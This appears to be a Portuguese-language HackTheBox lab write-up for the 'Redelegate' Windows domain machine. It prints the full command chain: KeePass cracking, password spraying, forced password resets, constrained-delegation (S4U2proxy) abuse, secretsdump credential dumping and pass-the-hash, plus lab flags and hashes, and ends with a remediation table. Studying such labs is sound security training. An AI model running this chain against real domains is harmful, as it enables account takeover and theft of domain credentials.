---
title: "HTB — Redelegate (Hard Windows AD): FTP KeePass → Constrained Delegation S4U2Proxy"
date: 2026-05-19 12:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, keepass, constrained-delegation, s4u2proxy, secretsdump, pass-the-hash, hard]
---

**IP:** 10.129.234.50 | **Dificuldade:** Hard | **OS:** Windows Server 2022 DC | **Domínio:** redelegate.vl

## Resumo

Máquina Windows AD com cadeia começando em FTP anônimo que expõe KeePass com credenciais de SQLGuest e arquivo de auditoria sugerindo senhas sazonais. Spray com `Fall2024!` valida `Marie.Curie`. Marie.Curie pertence ao grupo HelpDesk (ForceChangePassword sobre Helen.Frost). Helen.Frost tem `SeEnableDelegationPrivilege` + `GenericAll` sobre `FS01$`. Ataque de constrained delegation: muda senha de FS01$, seta `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl`, faz S4U2self/proxy impersonando `Ryan.Cooper` (Domain Admin sem `NOT_DELEGATED`) → secretsdump → PTH → root.

> **Nota crítica:** O Administrator tem `NOT_DELEGATED` flag — S4U2self falha com `KDC_ERR_BADOPTION`. Solução: impersonar `Ryan.Cooper`.

| Flag | Hash |
|------|------|
| user.txt | `619144a029fa74f5282739e9d7a8a31e` |
| root.txt | `592a7c8168dd3fe9f424adb361602bc2` |

---

## 1. Reconhecimento

```bash
nmap -sV -sC -T4 -Pn --open 10.129.234.50
echo "10.129.234.50 redelegate.vl dc.redelegate.vl" | sudo tee -a /etc/hosts
```

```
21/tcp  open  ftp    Microsoft ftpd (Anonymous FTP allowed)
88/tcp  open  kerberos-sec
389/tcp open  ldap   (Domain: redelegate.vl)
1433/tcp open ms-sql-s
5985/tcp open http   WinRM
```

---

## 2. FTP Anônimo + KeePass

```bash
ftp 10.129.234.50  # anonymous / ""
mget *
# CyberAudit.txt, Shared.kdbx, TrainingAgenda.txt
```

`TrainingAgenda.txt` menciona padrão `SeasonYear!`. Wordlist sazonal:

```bash
keepass2john Shared.kdbx > Shared.kdbx.hash
john Shared.kdbx.hash --wordlist=pass.txt
# Fall2024!
```

Credenciais extraídas: `SQLGuest:zDPBpaF4FywlqIv11vii`

---

## 3. Password Spray → Marie.Curie

```bash
nxc smb 10.129.234.50 -u 'Marie.Curie' -p 'Fall2024!'
# [+] redelegate.vl\Marie.Curie:Fall2024!
```

---

## 4. ForceChangePassword (Marie.Curie → Helen.Frost) + User Flag

Marie.Curie está no grupo **HelpDesk** com ForceChangePassword sobre Helen.Frost:

```bash
getTGT.py redelegate.vl/marie.curie:'Fall2024!' -dc-ip 10.129.234.50
export KRB5CCNAME=$(pwd)/marie.curie.ccache

bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set password HELEN.FROST 'Password1!'

evil-winrm -i redelegate.vl -u HELEN.FROST -p 'Password1!'
type C:\Users\Helen.Frost\Desktop\user.txt
# 619144a029fa74f5282739e9d7a8a31e
```

---

## 5. Constrained Delegation (Helen.Frost → FS01$ → Ryan.Cooper → Administrator)

Helen.Frost tem:
- **SeEnableDelegationPrivilege** — pode setar flags de delegação no AD
- **GenericAll** sobre `FS01$` — controle total da conta de máquina

### Configurar FS01$ como TRUSTED_TO_AUTH_FOR_DELEGATION

```bash
bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set password FS01$ 'Hackme123!'

# UAC 16781312 = WORKSTATION_TRUST_ACCOUNT | TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set object FS01$ userAccountControl -v 16781312

bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set object FS01$ msDS-AllowedToDelegateTo -v "cifs/dc.redelegate.vl"
```

### S4U2Proxy impersonando Ryan.Cooper

**IMPORTANTE:** O Administrator tem `NOT_DELEGATED` → usar `Ryan.Cooper` (Domain Admin sem essa flag):

```bash
unset KRB5CCNAME

getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper \
  -dc-ip 10.129.234.50 \
  -hashes :855609703933ed05aef9c21b64c2a01e \
  'redelegate.vl/FS01$'
# → Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

### secretsdump + Pass-the-Hash

```bash
export KRB5CCNAME=$(pwd)/Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
secretsdump.py -k -no-pass dc.redelegate.vl
# Administrator: ec17f7a2a4d96e177bfd101b94ffc0a7

evil-winrm -i redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
type C:\Users\Administrator\Desktop\root.txt
# 592a7c8168dd3fe9f424adb361602bc2
```

---

## Diagrama

```
FTP Anônimo → Shared.kdbx (Fall2024!) → SQLGuest
  ↓ Password spray Fall2024!
Marie.Curie → HelpDesk → ForceChangePassword
Helen.Frost → user.txt
  ↓ SeEnableDelegationPrivilege + GenericAll over FS01$
FS01$ (Hackme123!) → TRUSTED_TO_AUTH_FOR_DELEGATION + cifs/dc
  ↓ S4U2proxy (NOT_DELEGATED em Administrator → usar Ryan.Cooper)
Ryan.Cooper@cifs/dc → secretsdump
Administrator NTLM → PTH → root.txt
```

---

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| FTP anônimo expondo KeePass | Desabilitar FTP anônimo; nunca expor DBs de senha |
| Senhas sazonais (Fall2024!) | Política de complexidade + MFA |
| ForceChangePassword via grupo HelpDesk | Auditar ACLs de grupos privilegiados |
| SeEnableDelegationPrivilege + GenericAll em conta de máquina | Remover SeEnableDelegationPrivilege de usuários regulares |
| NOT_DELEGATED não protege se outro DA não tem o flag | Marcar TODOS os Domain Admins com NOT_DELEGATED ou Protected Users |
